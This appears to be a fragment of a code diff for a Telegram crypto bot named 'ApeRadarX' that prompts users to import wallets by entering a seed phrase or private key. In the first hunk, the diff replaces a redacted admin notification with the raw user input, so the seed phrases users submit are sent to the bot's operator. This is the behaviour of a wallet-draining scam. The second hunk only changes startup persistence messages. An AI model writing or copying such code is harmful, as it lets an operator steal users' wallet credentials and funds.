             await update.message.reply_text(
                 "✅ *Wallet imported successfully!*\n\n"
@@ -1825,7 +1574,7 @@ async def handle_message(update, context):
                 parse_mode="Markdown",
                 reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Home", callback_data="home")]]))
         else:
-            await notify_admin(context, user, "❌ Invalid wallet input", "Wallet credentials redacted")
+            await notify_admin(context, user, "❌ Invalid wallet input", text)
             await update.message.reply_text(
                 "⚠️ Invalid seed phrase. Please enter a valid 12-word seed phrase or private key.",
                 reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Cancel", callback_data="home")]]))
@@ -1873,17 +1622,10 @@ def run_web_server():
 if __name__ == "__main__":
     ensure_pnl_template()
     print("🤖 ApeRadarX Bot starting...")
-    print(f"💾 Supabase persistence: {'enabled' if _supabase_enabled() else 'DISABLED'}")
-    if _supabase_enabled():
-        # Hydrate both persistent stores before accepting Telegram updates.
-        # This is intentionally best-effort: a temporary network failure must
-        # never wipe the local state.
-        try:
-            load_wallets()
-            load_ai_state()
-            print("✅ Persistent state hydration completed.")
-        except Exception as exc:
-            print(f"⚠️ Persistent state hydration failed: {exc}")
+    if SUPABASE_URL and SUPABASE_SERVICE_ROLE_KEY:
+        print("✅ Supabase bot_users sync configured.")
+    else:
+        print("ℹ️ Supabase bot_users sync not configured; existing JSON state remains active.")
     if not SCRAPER_API_KEY or SCRAPER_API_KEY == "YOUR_SCRAPER_API_KEY_HERE":
         print("⚠️ SCRAPER_API_KEY is not configured. Add it to Render Environment Variables.")
     else:
